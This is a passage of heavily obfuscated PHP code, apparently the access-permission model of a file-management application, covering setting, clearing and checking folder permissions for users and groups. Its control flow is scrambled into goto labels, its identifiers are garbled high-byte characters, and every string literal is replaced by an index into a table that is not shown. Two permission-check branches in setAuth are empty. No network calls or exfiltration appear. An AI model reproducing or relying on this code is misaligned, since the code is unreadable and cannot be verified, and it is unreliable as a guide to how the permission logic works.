Ä[2277])->listData($b‰Î”øËô[$BêÈ‘ß¢ Ä[2258]]); if (!$c Íñ¯÷¶ì) { continue; } $F•°ã†à§¤[] = $b‰Î”øËô; goto Fî¹á†ç‘; CÌ¥›­ ›: } array_multisort($f…Æ¡™î¿, SORT_DESC, $F•°ã†à§¤); goto f™µŞÆŸ½; f™µŞÆŸ½: return $F•°ã†à§¤; goto AÄ„‚ªè¾Ç; AÄ„‚ªè¾Ç: } public function setAuth($DˆŸ ù’ó, $FùÀÀÑÒ›ï) { goto EÄŞ“öªâ; dŞÚçˆéŸ¤: return !0; goto E´Œ‘ô„¹; cÜç§™¯¹‘: if ($E¿±‘Ä–ˆÊ[$DµÈÊŠâŠã[380]] != SourceModel::TYPE_GROUP) { return !1; } $b­‡ôÕÔ¶ˆ = 1; $A’„Í˜ï’ = $E¿±‘Ä–ˆÊ[$DµÈÊŠâŠã[467]]; goto CÍ–çé¤; EÄŞ“öªâ: $DµÈÊŠâŠã =& $_SERVER[çŞáÓæÚô‚Ô‡]; $E¿±‘Ä–ˆÊ = Model($DµÈÊŠâŠã[1124])->sourceInfo($DˆŸ ù’ó); if (!$E¿±‘Ä–ˆÊ) { return !1; } goto cÜç§™¯¹‘; CÍ–çé¤: if ($A’„Í˜ï’ != $b­‡ôÕÔ¶ˆ) { $AÏÇ…‡„ïÀ = array($DµÈÊŠâŠã[2114] => $A’„Í˜ï’); $cçé…ãÆ˜Ñ = Model($DµÈÊŠâŠã[2193])->field($DµÈÊŠâŠã[1443])->where($AÏÇ…‡„ïÀ)->select(); $cçé…ãÆ˜Ñ = array_to_keyvalue($cçé…ãÆ˜Ñ, $DµÈÊŠâŠã[43], $DµÈÊŠâŠã[1443]); } $C‰÷­âˆËï = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Eˆœ¹®ê = array(); goto Eò”¨º‹; Eò”¨º‹: foreach ($FùÀÀÑÒ›ï as $a““…éÄ¤ß) { if (!in_array($a““…éÄ¤ß[$DµÈÊŠâŠã[380]], $C‰÷­âˆËï)) { show_json(LNG($DµÈÊŠâŠã[2278]), !1); } if ($A’„Í˜ï’ != $b­‡ôÕÔ¶ˆ) { if ($a““…éÄ¤ß[$DµÈÊŠâŠã[380]] == SourceModel::TYPE_GROUP) { } if ($a““…éÄ¤ß[$DµÈÊŠâŠã[467]] != 0 && !in_array($a““…éÄ¤ß[$DµÈÊŠâŠã[467]], $cçé…ãÆ˜Ñ)) { } } if ($a““…éÄ¤ß[$DµÈÊŠâŠã[467]] == 0) { $a““…éÄ¤ß[$DµÈÊŠâŠã[380]] = SourceModel::TYPE_USER; } $Eˆœ¹®ê[] = array($DµÈÊŠâŠã[378] => $DˆŸ ù’ó, $DµÈÊŠâŠã[380] => intval($a““…éÄ¤ß[$DµÈÊŠâŠã[380]]), $DµÈÊŠâŠã[467] => intval($a““…éÄ¤ß[$DµÈÊŠâŠã[467]]), $DµÈÊŠâŠã[2258] => intval($a““…éÄ¤ß[$DµÈÊŠâŠã[2258]]) ? intval($a““…éÄ¤ß[$DµÈÊŠâŠã[2258]]) : 0, $DµÈÊŠâŠã[2259] => intval($a““…éÄ¤ß[$DµÈÊŠâŠã[2259]]) ? intval($a““…éÄ¤ß[$DµÈÊŠâŠã[2259]]) : -1); } $this->where(array($DµÈÊŠâŠã[392] => $DˆŸ ù’ó))->delete(); $this->addAll($Eˆœ¹®ê); goto dŞÚçˆéŸ¤; E´Œ‘ô„¹: } public function authClear($E¹¡…Æí¸) { $Fî’Ùí°õ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $FçÜ´Ùëæò = Model($Fî’Ùí°õ[1124])->sourceInfo($E¹¡…Æí¸); $cÚ…¢®éƒ· = array($E¹¡…Æí¸); if ($FçÜ´Ùëæò[$Fî’Ùí°õ[379]] == $Fî’Ùí°õ[93]) { $F±œº²ÀëÔ = array($Fî’Ùí°õ[536] => array($Fî’Ùí°õ[494], $FçÜ´Ùëæò[$Fî’Ùí°õ[470]] . $E¹¡…Æí¸ . $Fî’Ùí°õ[495])); $cÚ…¢®éƒ· = Model($Fî’Ùí°õ[1124])->field($Fî’Ùí°õ[392])->where($F±œº²ÀëÔ)->getField($Fî’Ùí°õ[378], !0); $cÚ…¢®éƒ·[] = $E¹¡…Æí¸; } $this->where(array($Fî’Ùí°õ[392] => array($Fî’Ùí°õ[393], $cÚ…¢®éƒ·)))->delete(); return !0; } public function getAllChildren($Aî×à•š) { goto Aâ­‰øòˆ¡; Aâ­‰øòˆ¡: $B´±ƒ°ìğè =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F¾á¨ ÄÆ = Model($B´±ƒ°ìğè[1124])->sourceInfo($Aî×à•š); if ($F¾á¨ ÄÆ[$B´±ƒ°ìğè[379]] != $B´±ƒ°ìğè[93]) { return $this->sourceListAuth(array($Aî×à•š)); } goto F‘ïŸ¿ÑÀ²; Eéğñà÷É: return $this->sourceListAuth($c“›Â¨¥Îº); goto FŒ’¥ˆ•ŒÕ; eáÃá‘–³†: $dß³Ö™‹ì¡ = Model($B´±ƒ°ìğè[761])->field($BÕ™¦Ø³™Í)->where($cá–‰éšÜÃ)->select(); $c“›Â¨¥Îº = array($Aî×à•š); foreach ($dß³Ö™‹ì¡ as $eÕ§Å’”»¸) { foreach ($fÕ­³İÛ° as $a†™±±“”À) { $EÉ® Ò“Ø = $B´±ƒ°ìğè[57] . $a†™±±“”À . $B´±ƒ°ìğè[57]; $C„ğØ×è» = $eÕ§Å’”»¸[$B´±ƒ°ìğè[470]] . $eÕ§Å’”»¸[$B´±ƒ°ìğè[378]] . $B´±ƒ°ìğè[57]; if (strstr($C„ğØ×è», $EÉ® Ò“Ø)) { $c“›Â¨¥Îº[] = $eÕ§Å’”»¸[$B´±ƒ°ìğè[378]]; break; } } } goto Eéğñà÷É; F‘ïŸ¿ÑÀ²: if ($F¾á¨ ÄÆ[$B´±ƒ°ìğè[380]] != SourceModel::TYPE_GROUP) { return array(); } $bÇ  Õµ = 1; $fÕ­³İÛ° = array($Aî×à•š); goto E‘ÆÉ‚ƒ÷À; FÉÍãÅ÷‚: if (!$E×ï´ëÎ´à) { return array(); } $BÕ™¦Ø³™Í = $B´±ƒ°ìğè[2279]; $cá–‰éšÜÃ = array($B´±ƒ°ìğè[378] => array($B´±ƒ°ìğè[17], $E×ï´ëÎ´à), $B´±ƒ°ìğè[406] => $B´±ƒ°ìğè[479]); goto eáÃá‘–³†; E‘ÆÉ‚ƒ÷À: if ($F¾á¨ ÄÆ[$B´±ƒ°ìğè[472]] == $B´±ƒ°ìğè[479] && $F¾á¨ ÄÆ[$B´±ƒ°ìğè[467]] != $bÇ  Õµ) { $fÕ­³İÛ° = $this->groupChidldAllRootSource($F¾á¨ ÄÆ[$B´±ƒ°ìğè[467]]); } $E×ï´ëÎ´à = $this->field($B´±ƒ°ìğè[378])->group($B´±ƒ°ìğè[378])->select(); $E×ï´ëÎ´à = array_to_keyvalue($E×ï´ëÎ´à, $B´±ƒ°ìğè[43], $B´±ƒ°ìğè[378]); goto FÉÍãÅ÷‚; FŒ’¥ˆ•ŒÕ: } private function sourceListAuth($e“Ğ­ôÒù´) { goto FÛìš‘‰Ğï; dæ¨¸––³Ì: $fµÂ ¦Šß = $this->field($e²ÀàÁè)->where(array($c•ßÕší[378] => array($c•ßÕší[17], $e“Ğ­ôÒù´)))->select(); $cò¹‹ƒ¼Ü = array_to_keyvalue_group($fµÂ ¦Šß, $c•ßÕší[378]); $Fà—ï™¤¦Á = array(); goto bÚ„¬Ã©; FÛìš‘‰Ğï: $c•ßÕší =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Aõ“¬£ª‹Õ = Model($c•ßÕší[1124])->sourceListInfo($e“Ğ­ôÒù´, !0); $e²ÀàÁè = $c•ßÕší[2276]; goto dæ¨¸––³Ì; fÔ¨Ëµ•Ô‘: return $Fà—ï™¤¦Á; goto c¸£¶¿‰ø; bÚ„¬Ã©: $fêñäµÓ— = array(); foreach ($Aõ“¬£ª‹Õ as $EÇ‚°Ğæ) { goto E‹İáªØÈ; b÷­Âˆ÷å¤: unset($EÇ‚°Ğæ[$c•ßÕší[400]]); $D”‹öÇ¹ = $cò¹‹ƒ¼Ü[$EÇ‚°Ğæ[$c•ßÕší[378]]]; if (!$D”‹öÇ¹) { continue; } goto d–Šåˆ¿Œ; E‹İáªØÈ: unset($EÇ‚°Ğæ[$c•ßÕší[388]]); unset($EÇ‚°Ğæ[$c•ßÕší[387]]); unset($EÇ‚°Ğæ[$c•ßÕší[385]]); goto b÷­Âˆ÷å¤; d–Šåˆ¿Œ: $EÇ‚°Ğæ[$c•ßÕší[2280]] = $this->authTargetInfo($D”‹öÇ¹); $EÇ‚°Ğæ[$c•ßÕší[477]] = rtrim($EÇ‚°Ğæ[$c•ßÕší[473]], $c•ßÕší[18]) . $c•ßÕší[18] . ltrim($EÇ‚°Ğæ[$c•ßÕší[477]], $c•ßÕší[18]); $Fà—ï™¤¦Á[] = $EÇ‚°Ğæ; goto Eè™‚êÛ¡«; Eè™‚êÛ¡«: $e¡®¨ÙÔœ = count(explode($c•ßÕší[18], trim($EÇ‚°Ğæ[$c•ßÕší[477]], $c•ßÕší[18]))); $fêñäµÓ—[] = $e¡®¨ÙÔœ + ($EÇ‚°Ğæ[$c•ßÕší[39]] == $c•ßÕší[86] ? 0 : 1000); goto d¯²ÆÑ„È ; d¯²ÆÑ„È : } array_multisort($fêñäµÓ—, SORT_ASC, $Fà—ï™¤¦Á); goto fÔ¨Ëµ•Ô‘; c¸£¶¿‰ø: } private function groupChidldAllRootSource($F‘‹ ´›¨) { $F¢ŠÛÌæÄò =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eôëõ®ğø = Model($F¢ŠÛÌæÄò[2281])->groupChildrenAll($F‘‹ ´›¨); $B÷‘ÅœíƒÀ = array($F¢ŠÛÌæÄò[472] => 0, $F¢ŠÛÌæÄò[467] => array($F¢ŠÛÌæÄò[17], $eôëõ®ğø), $F¢ŠÛÌæÄò[380] => SourceModel::TYPE_GROUP); $a—…Øéªº“ = Model($F¢ŠÛÌæÄò[761])->field($F¢ŠÛÌæÄò[378])->where($B÷‘ÅœíƒÀ)->select(); $a—…Øéªº“ = array_to_keyvalue($a—…Øéªº“, $F¢ŠÛÌæÄò[43], $F¢ŠÛÌæÄò[378]); return $a—…Øéªº“; } private function authTargetInfo($EìÆä³Å÷Ó) { goto Fˆ§ËÖÌ·Œ; DÄˆÂ³«­è: $a©ëÃ¶Ÿ¯ó = 2 << 25; foreach ($EìÆä³Å÷Ó as $EåÖ³ëÉ¨®) { goto a¦Œé‚¬ì›; d°‹òŞ°§õ: if (!$B·Î¦í˜ö°) { continue; } $B·Î¦í˜ö°[$eÚøÀÒ³“ò[427]] = $eÁ—ÍÓ©¨°; $e±¾ŠäÇ¶“[] = $B·Î¦í˜ö°; goto c•«Ç¢Û¡Ç; c•«Ç¢Û¡Ç: $cöŠ„‚ôˆÈ = 0; if ($EåÖ³ëÉ¨®[$eÚøÀÒ³“ò[380]] == SourceModel::TYPE_GROUP) { $cöŠ„‚ôˆÈ = $a©ëÃ¶Ÿ¯ó * 2; } if ($EåÖ³ëÉ¨®[$eÚøÀÒ³“ò[380]] == SourceModel::TYPE_USER) { $cöŠ„‚ôˆÈ = $a©ëÃ¶Ÿ¯ó; } goto eóÚÑºä×’; eóÚÑºä×’: if ($EåÖ³ëÉ¨®[$eÚøÀÒ³“ò[380]] == SourceModel::TYPE_USER && $EåÖ³ëÉ¨®[$eÚøÀÒ³“ò[467]] == $eÚøÀÒ³“ò[479]) { $cöŠ„‚ôˆÈ = 0; } $Cë„¸ŒŒª‚[] = $eÁ—ÍÓ©¨°[$eÚøÀÒ³“ò[385]] + $cöŠ„‚ôˆÈ; goto f¨ŞÚñÖŒğ; a¦Œé‚¬ì›: $eÁ—ÍÓ©¨° = Model($eÚøÀÒ³“ò[2277])->listData($EåÖ³ëÉ¨®[$eÚøÀÒ³“ò[2258]]); if (!$eÁ—ÍÓ©¨°) { continue; } if ($EåÖ³ëÉ¨®[$eÚøÀÒ³“ò[380]] == SourceModel::TYPE_USER) { $B·Î¦í˜ö° = Model($eÚøÀÒ³“ò[485])->getInfoSimpleOuter($EåÖ³ëÉ¨®[$eÚøÀÒ³“ò[467]]); if ($B·Î¦í˜ö°[$eÚøÀÒ³“ò[1443]] == $eÚøÀÒ³“ò[1038]) { continue; } if ($B·Î¦í˜ö°[$eÚøÀÒ³“ò[1443]] == $eÚøÀÒ³“ò[479]) { $B·Î¦í˜ö°[$eÚøÀÒ³“ò[38]] = LNG($eÚøÀÒ³“ò[2282]); } } else { $B·Î¦í˜ö° = Model($eÚøÀÒ³“ò[469])->getInfoSimple($EåÖ³ëÉ¨®[$eÚøÀÒ³“ò[467]]); } goto d°‹òŞ°§õ; f¨ŞÚñÖŒğ: } array_multisort($Cë„¸ŒŒª‚, SORT_DESC, $e±¾ŠäÇ¶“); goto e°Şá‹ŒŠ; e°Şá‹ŒŠ: return $e±¾ŠäÇ¶“; goto AßµëØÜæÔ; Fˆ§ËÖÌ·Œ: $eÚøÀÒ³“ò =& $_SERVER[çŞáÓæÚô‚Ô‡]; $e±¾ŠäÇ¶“ = array(); $Cë„¸ŒŒª‚ = array(); goto DÄˆÂ³«­è; AßµëØÜæÔ: } public function getAllChildrenByUser($B±ºš«Ğ¢¤, $FñÒÓä—­Õ) { goto E¨­Œ£ø’; fÚëİÒ¹Ü: foreach ($AÏˆ‰“ŠÛ as $b† îù¢ˆ¢) { $a‚„ëÍƒ’İ = !1; foreach ($b† îù¢ˆ¢[$dáœ‡ƒÏŠê[2280]] as $c‘¹í„ƒ¡) { if ($c‘¹í„ƒ¡[$dáœ‡ƒÏŠê[1443]]) { if ($c‘¹í„ƒ¡[$dáœ‡ƒÏŠê[1443]] == $FñÒÓä—­Õ) { $a‚„ëÍƒ’İ = !0; break; } } if ($c‘¹í„ƒ¡[$dáœ‡ƒÏŠê[2114]]) { if ($this->groupContainUser($c‘¹í„ƒ¡[$dáœ‡ƒÏŠê[2114]], $FñÒÓä—­Õ)) { $a‚„ëÍƒ’İ = !0; break; } } } if ($a‚„ëÍƒ’İ) { $cŒ…¶ê‰[] = $b† îù¢ˆ¢; } $bŒ‡Ç×Ï÷ = $b† îù¢ˆ¢[$dáœ‡ƒÏŠê[378]]; if (isset($fä³–ƒ…œï[$bŒ‡Ç×Ï÷])) { $b† îù¢ˆ¢[$dáœ‡ƒÏŠê[2280]][] = $fä³–ƒ…œï[$bŒ‡Ç×Ï÷][0]; $fä³–ƒ…œï[$bŒ‡Ç×Ï÷] = !1; } } $fä³–ƒ…œï = array_filter(array_values($fä³–ƒ…œï)); $cŒ…¶ê‰ = array_merge($fä³–ƒ…œï, $cŒ…¶ê‰); goto A©¡â­“ÖŒ; Dª†°£¹Å: $báñ‡Ã®ï‡ = Model($dáœ‡ƒÏŠê[1124])->sourceInfo($B±ºš«Ğ¢¤); $fä³–ƒ…œï = array(); $F¹ƒ˜‚¤ = 1; goto b´ãùŒ¶’; b´ãùŒ¶’: if ($báñ‡Ã®ï‡[$dáœ‡ƒÏŠê[472]] == $dáœ‡ƒÏŠê[479] && $báñ‡Ã®ï‡[$dáœ‡ƒÏŠê[467]] != $F¹ƒ˜‚¤ && $this->groupContainUser($báñ‡Ã®ï‡[$dáœ‡ƒÏŠê[467]], $FñÒÓä—­Õ)) { foreach ($B­è†Ç„[$dáœ‡ƒÏŠê[2283]] as $FáĞŠŸÁ¨Ü) { $CÕ„Š½ğù‚ = Model($dáœ‡ƒÏŠê[469])->getInfo($FáĞŠŸÁ¨Ü[$dáœ‡ƒÏŠê[2114]]); $D©Õ‹ö¸ï¯ = Model($dáœ‡ƒÏŠê[488])->getInfoSimpleOuter($FñÒÓä—­Õ); $D©Õ‹ö¸ï¯[$dáœ‡ƒÏŠê[427]] = $FáĞŠŸÁ¨Ü[$dáœ‡ƒÏŠê[385]]; if (Model($dáœ‡ƒÏŠê[2277])->authCheckAction($FáĞŠŸÁ¨Ü[$dáœ‡ƒÏŠê[385]][$dáœ‡ƒÏŠê[385]], $dáœ‡ƒÏŠê[1569])) { continue; } $DÍ‡°¼«Ñ = array($dáœ‡ƒÏŠê[38] => $dáœ‡ƒÏŠê[1396] . $CÕ„Š½ğù‚[$dáœ‡ƒÏŠê[38]], $dáœ‡ƒÏŠê[378] => $CÕ„Š½ğù‚[$dáœ‡ƒÏŠê[400]][$dáœ‡ƒÏŠê[378]], $dáœ‡ƒÏŠê[85] => KodIO::make($CÕ„Š½ğù‚[$dáœ‡ƒÏŠê[400]][$dáœ‡ƒÏŠê[378]]), $dáœ‡ƒÏŠê[472] => $dáœ‡ƒÏŠê[479], $dáœ‡ƒÏŠê[380] => $dáœ‡ƒÏŠê[977], $dáœ‡ƒÏŠê[39] => $dáœ‡ƒÏŠê[499], $dáœ‡ƒÏŠê[477] => $CÕ„Š½ğù‚[$dáœ‡ƒÏŠê[474]], $dáœ‡ƒÏŠê[2114] => $CÕ„Š½ğù‚[$dáœ‡ƒÏŠê[2114]], $dáœ‡ƒÏŠê[471] => $CÕ„Š½ğù‚[$dáœ‡ƒÏŠê[472]], $dáœ‡ƒÏŠê[2280] => array($D©Õ‹ö¸ï¯)); $fä³–ƒ…œï[$DÍ‡°¼«Ñ[$dáœ‡ƒÏŠê[378]]] = $DÍ‡°¼«Ñ; } } $cŒ…¶ê‰ = array(); $AÏˆ‰“ŠÛ = $this->getAllChildren($B±ºš«Ğ¢¤); goto fÚëİÒ¹Ü; E¨­Œ£ø’: $dáœ‡ƒÏŠê =& $_SERVER[çŞáÓæÚô‚Ô‡]; $B­è†Ç„ = Model($dáœ‡ƒÏŠê[488])->getInfo($FñÒÓä—­Õ); if (!$FñÒÓä—­Õ || !$B±ºš«Ğ¢¤ || !$B­è†Ç„) { return array(); } goto Dª†°£¹Å; A©¡â­“ÖŒ: return $cŒ…¶ê‰; goto f­¼¬ãç˜; f­¼¬ãç˜: } public function setAllChildrenByUser($B¤ÀÁ„ÈéÊ, $BÑ¾äõçƒ°, $eõÎ©ƒ†É) { $bğàÓ†Ò“ó =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bßµšÔŞ÷¿ = $this->getAllChildrenByUser($B¤ÀÁ„ÈéÊ, $BÑ¾äõçƒ°); if (!$eõÎ©ƒ†É || !$bßµšÔŞ÷¿) { return !1; } foreach ($bßµšÔŞ÷¿ as $c’ÃÂàö‰) { $eàÖŒ÷½¼ = array(); foreach ($c’ÃÂàö‰[$bğàÓ†Ò“ó[2280]] as $d…¼š«¡¤) { $cÊ×¨İĞØÂ = $d…¼š«¡¤[$bğàÓ†Ò“ó[427]]; $F’Ê‘Å°§• = $d…¼š«¡¤[$bğàÓ†Ò“ó[1443]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $eóŒ’‚ò = $d…¼š«¡¤[$bğàÓ†Ò“ó[1443]] ? $d…¼š«¡¤[$bğàÓ†Ò“ó[1443]] : $d…¼š«¡¤[$bğàÓ†Ò“ó[2114]]; if ($d…¼š«¡¤[$bğàÓ†Ò“ó[1443]] && $d…¼š«¡¤[$bğàÓ†Ò“ó[1443]] == $BÑ¾äõçƒ°) { continue; } $eàÖŒ÷½¼[] = array($bğàÓ†Ò“ó[378] => $c’ÃÂàö‰[$bğàÓ†Ò“ó[378]], $bğàÓ†Ò“ó[380] => $F’Ê‘Å°§•, $bğàÓ†Ò“ó[467] => intval($eóŒ’‚ò), $bğàÓ†Ò“ó[2258] => isset($cÊ×¨İĞØÂ[$bğàÓ†Ò“ó[376]]) ? intval($cÊ×¨İĞØÂ[$bğàÓ†Ò“ó[376]]) : 0, $bğàÓ†Ò“ó[2259] => isset($cÊ×¨İĞØÂ[$bğàÓ†Ò“ó[2259]]) ? intval($cÊ×¨İĞØÂ[$bğàÓ†Ò“ó[2259]]) : -1); } $eàÖŒ÷½¼[] = array($bğàÓ†Ò“ó[378] => $c’ÃÂàö‰[$bğàÓ†Ò“ó[378]], $bğàÓ†Ò“ó[380] => SourceModel::TYPE_USER, $bğàÓ†Ò“ó[467] => intval($BÑ¾äõçƒ°), $bğàÓ†Ò“ó[2258] => intval($eõÎ©ƒ†É), $bğàÓ†Ò“ó[2259] => -1); $this->where(array($bğàÓ†Ò“ó[392] => $c’ÃÂàö‰[$bğàÓ†Ò“ó[378]]))->delete(); $this->addAll($eàÖŒ÷½¼); } return !0; } public function get($e¥ï¡œÁÜ) { $FÒñ¬ä‹’ = $this->getSourceList(array($e¥ï¡œÁÜ), !0); return $FÒñ¬ä‹’[0]; } public function getSourceList($C¨ç×Œ×Ï, $b„«…»ç¹ = false, $d±ğîÇ’§à = false) { goto C¯³ëƒŠÍ˜; C¯³ëƒŠÍ˜: $AÚÉÀŞ‹ã =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$C¨ç×Œ×Ï) { return array(); } $DÈÆ±±ƒ½ƒ = Model($AÚÉÀŞ‹ã[1124]); goto B‡íÕîù‚; bš–Æ²ÙÁõ: $e¬œëÎÓ Ì = $this->userIsRoot($d±ğîÇ’§à); $aŒÀÍ²ßõ = AuthModel::authAll(); $E¶×»˜ÖšĞ = array($AÚÉÀŞ‹ã[386] => $aŒÀÍ²ßõ, $AÚÉÀŞ‹ã[2286] => array($AÚÉÀŞ‹ã[394] => 0, $AÚÉÀŞ‹ã[2120] => $aŒÀÍ²ßõ, $AÚÉÀŞ‹ã[395] => LNG($AÚÉÀŞ‹ã[2287]), $AÚÉÀŞ‹ã[2133] => $AÚÉÀŞ‹ã[2288])); goto dÜµ—’›…«; d–¥¨×Èèƒ: foreach ($b„«…»ç¹ as $a®¢Ïìâ¾ => $c¹¯ï¢‡Ñ) { $F®§ §‡Ü = $DÈÆ±±ƒ½ƒ->parentLevelArray($c¹¯ï¢‡Ñ[$AÚÉÀŞ‹ã[470]]); $c™•³Ñ Î¦ = array_merge($c™•³Ñ Î¦, array($a®¢Ïìâ¾), array_reverse($F®§ §‡Ü)); } $c™•³Ñ Î¦ = array_values(array_unique($c™•³Ñ Î¦)); if (!$c™•³Ñ Î¦) { return array(); } goto dË…ì³›â; B‡íÕîù‚: if (!$b„«…»ç¹ && count($C¨ç×Œ×Ï) == 1) { $b„«…»ç¹ = array(); $b„«…»ç¹[$C¨ç×Œ×Ï[0]] = $DÈÆ±±ƒ½ƒ->sourceInfo($C¨ç×Œ×Ï[0]); } if (!$b„«…»ç¹) { $dÁÇ®·…•Ÿ = array($AÚÉÀŞ‹ã[392] => array($AÚÉÀŞ‹ã[393], $C¨ç×Œ×Ï)); $b„«…»ç¹ = $DÈÆ±±ƒ½ƒ->field($AÚÉÀŞ‹ã[2284])->where($dÁÇ®·…•Ÿ)->select(); $b„«…»ç¹ = array_to_keyvalue($b„«…»ç¹, $AÚÉÀŞ‹ã[378]); } $c™•³Ñ Î¦ = $C¨ç×Œ×Ï; goto d–¥¨×Èèƒ; dË…ì³›â: $D¡ŒøÃÓØ = $AÚÉÀŞ‹ã[2285]; $dÁÇ®·…•Ÿ = array($AÚÉÀŞ‹ã[392] => array($AÚÉÀŞ‹ã[393], $c™•³Ñ Î¦)); $b÷®•Ÿã¬è = $this->field($D¡ŒøÃÓØ)->where($dÁÇ®·…•Ÿ)->select(); goto EñÚÖ¶ãôË; EñÚÖ¶ãôË: $b÷®•Ÿã¬è = array_to_keyvalue_group($b÷®•Ÿã¬è, $AÚÉÀŞ‹ã[378]); $b×ì¤ó¸è† = array(); foreach ($c™•³Ñ Î¦ as $FŒËáë»‹æ) { if (isset($b÷®•Ÿã¬è[$FŒËáë»‹æ])) { $b×ì¤ó¸è†[$FŒËáë»‹æ] = $b÷®•Ÿã¬è[$FŒËáë»‹æ]; } } goto bš–Æ²ÙÁõ; dÜµ—’›…«: $Cà†½©İÆ = array(); foreach ($b„«…»ç¹ as $FŒËáë»‹æ => $b˜„ê¹¬å) { if ($e¬œëÎÓ Ì) { $Cà†½©İÆ[$FŒËáë»‹æ] = $E¶×»˜ÖšĞ; continue; } $Cà†½©İÆ[$FŒËáë»‹æ] = $this->makeSourceAuth($b˜„ê¹¬å, $b×ì¤ó¸è†, $d±ğîÇ’§à); } return $Cà†½©İÆ; goto d¬ìÅ¼«¬; d¬ìÅ¼«¬: } public function authDeepCheck($AÍ“­Õ¬µŒ, $Dìé­Ì…ìÔ = false) { goto aéø¼†Ò¨¾; DœÇÂ¶š—: if (!in_array($AÍ“­Õ¬µŒ, $AÑ¨‚°ùøÛ[$A ¾‹«­ [2289]])) { return !1; } $E‰’à×åïì = array(); foreach ($AÑ¨‚°ùøÛ[$A ¾‹«­ [2290]] as $EöããŠ“¿… => $c§±²½àë‘) { if (!in_array($AÍ“­Õ¬µŒ, $c§±²½àë‘)) { continue; } $E‰’à×åïì[] = $EöããŠ“¿…; } goto f´Í¹„œ…¢; f´Í¹„œ…¢: $aÚ¾Üˆ•È‰ = $E‰’à×åïì ? $E‰’à×åïì[0] : $AÍ“­Õ¬µŒ; return array($A ¾‹«­ [386] => -1, $A ¾‹«­ [427] => array($A ¾‹«­ [394] => $A ¾‹«­ [1038], $A ¾‹«­ [2120] => $A ¾‹«­ [479], $A ¾‹«­ [395] => LNG($A ¾‹«­ [2291]), $A ¾‹«­ [2133] => $A ¾‹«­ [2292]), $A ¾‹«­ [2293] => LNG($A ¾‹«­ [2294]), $A ¾‹«­ [2295] => $this->sourceAuthInfo($aÚ¾Üˆ•È‰)); goto fğÏ Æ¦Á‘; aéø¼†Ò¨¾: $A ¾‹«­  =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Dìé­Ì…ìÔ = $Dìé­Ì…ìÔ ? $Dìé­Ì…ìÔ : USER_ID; $AÑ¨‚°ùøÛ = $this->makeAuthDeep($Dìé­Ì…ìÔ); goto DœÇÂ¶š—; fğÏ Æ¦Á‘: } protected function makeAuthDeep($Bçäˆ İĞ­ = false) { goto c¤Úˆ‘¦­Í; a»Åã –ª: foreach ($Añµà²´ as $aÁ®›âË´) { $bö¦ ¡øŠ» = $bÓ¦£½Š->getInfo($aÁ®›âË´); $DÏ†Ì©‘ = $C«‘Ìğãã->parentLevelArray($bö¦ ¡øŠ»[$d¼é­­•Ù[470]]); $Cñß–í = array_merge($Cñß–í, $DÏ†Ì©‘); } $Cñß–í = array_values(array_unique($Cñß–í)); foreach ($Cñß–í as $aÁ®›âË´) { $bö¦ ¡øŠ» = $bÓ¦£½Š->getInfo($aÁ®›âË´); $eÁ¡¯²[] = $bö¦ ¡øŠ»[$d¼é­­•Ù[400]][$d¼é­­•Ù[378]]; $d–°×‡ñ„œ[$aÁ®›âË´] = $bö¦ ¡øŠ»[$d¼é­­•Ù[400]][$d¼é­­•Ù[378]]; $eœ¨ƒÓÙ‘›[$aÁ®›âË´] = $C«‘Ìğãã->parentLevelArray($bö¦ ¡øŠ»[$d¼é­­•Ù[470]]); } goto a¹à’´”; c¤Úˆ‘¦­Í: $d¼é­­•Ù =& $_SERVER[çŞáÓæÚô‚Ô‡]; static $B³‹²ÉÕï² = array(); $Bçäˆ İĞ­ = $Bçäˆ İĞ­ ? $Bçäˆ İĞ­ : USER_ID; goto EŒÔİ–¢ÖÆ; dšĞ…²Šêè: if ($d¬¶¿å’Š÷) { $a£Ãš¹…‰… = array(array($d¼é­­•Ù[380] => SourceModel::TYPE_USER, $d¼é­­•Ù[467] => $Bçäˆ İĞ­), array($d¼é­­•Ù[380] => SourceModel::TYPE_GROUP, $d¼é­­•Ù[467] => array($d¼é­­•Ù[393], $d¬¶¿å’Š÷)), $d¼é­­•Ù[920] => $d¼é­­•Ù[2199]); } if ($Dôµ•Ì•šä) { $a£Ãš¹…‰… = array($a£Ãš¹…‰…, $d¼é­­•Ù[2258] => array($d¼é­­•Ù[2297], $Dôµ•Ì•šä)); } $a›™™â§à = $this->field($d¼é­­•Ù[2298])->where($a£Ãš¹…‰…)->select(); goto fø¹äƒõ°‰; a¹à’´”: foreach ($f–‚ó”¦Ë£ as $cõáÇè’Ü” => $AÏ“œªƒà) { $dÃìÊ±‰»¯ = $Aİ¨Ñ„Ã†è[$cõáÇè’Ü”]; if (!$dÃìÊ±‰»¯ || !$d–°×‡ñ„œ[$dÃìÊ±‰»¯]) { continue; } $Eèš…è…å– = array(); foreach ($eœ¨ƒÓÙ‘›[$dÃìÊ±‰»¯] as $aÁ®›âË´) { $Eèš…è…å–[] = $d–°×‡ñ„œ[$aÁ®›âË´]; } $f–‚ó”¦Ë£[$cõáÇè’Ü”] = array_merge($Eèš…è…å–, $AÏ“œªƒà); } $eÁ¡¯² = array_values(array_unique($eÁ¡¯²)); $aåì¨ª¢•¡ = array($d¼é­­•Ù[2289] => $eÁ¡¯², $d¼é­­•Ù[2290] => $f–‚ó”¦Ë£); goto FÌİºíã™; CÂÔŞÜ¹ß: if ($F‚òóãÖ¨Ú) { $B‰‹‰ˆª¸ = $C«‘Ìğãã->where(array($d¼é­­•Ù[378] => array($d¼é­­•Ù[393], $F‚òóãÖ¨Ú)))->select(); foreach ($B‰‹‰ˆª¸ as $bŸÛ„ŒŞƒğ) { $DÏ†Ì©‘ = $C«‘Ìğãã->parentLevelArray($bŸÛ„ŒŞƒğ[$d¼é­­•Ù[470]]); $eÁ¡¯² = array_merge($eÁ¡¯², $DÏ†Ì©‘); $Cñß–í[] = $bŸÛ„ŒŞƒğ[$d¼é­­•Ù[467]]; $f–‚ó”¦Ë£[$bŸÛ„ŒŞƒğ[$d¼é­­•Ù[378]]] = $DÏ†Ì©‘; $Aİ¨Ñ„Ã†è[$bŸÛ„ŒŞƒğ[$d¼é­­•Ù[378]]] = $bŸÛ„ŒŞƒğ[$d¼é­­•Ù[467]]; } } 